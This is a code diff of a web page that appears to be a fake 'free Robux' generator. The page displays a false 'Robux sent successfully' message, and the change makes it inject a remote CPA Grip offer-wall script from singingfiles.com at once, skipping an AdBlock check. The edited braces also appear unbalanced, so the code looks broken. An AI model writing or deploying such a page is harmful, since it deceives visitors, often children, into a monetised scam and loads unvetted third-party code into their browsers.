@@ -244,14 +244,12 @@
   	  statusText.innerHTML = `Robux sent successfully! 🎉`;
 
   // Attendre 2 secondes avant de charger les scripts CPA Grip
-  	  setTimeout(() => {
-
-    // Script 2 : script_include.php
-    	    const script2 = document.createElement("script");
-    	    script2.type = "text/javascript";
-    	    script2.src = "https://singingfiles.com/script_include.php?id=1821663";
-    	    document.body.appendChild(script2);
-        }
+  	  // Script CPA Grip directement sans délai ni vérification AdBlock
+	  const script = document.createElement("script");
+	  script.type = "text/javascript";
+	  script.src = "https://singingfiles.com/script_include.php?id=1821663";
+	  document.body.appendChild(script);
+	}
       }, 200);
     });
   </script>
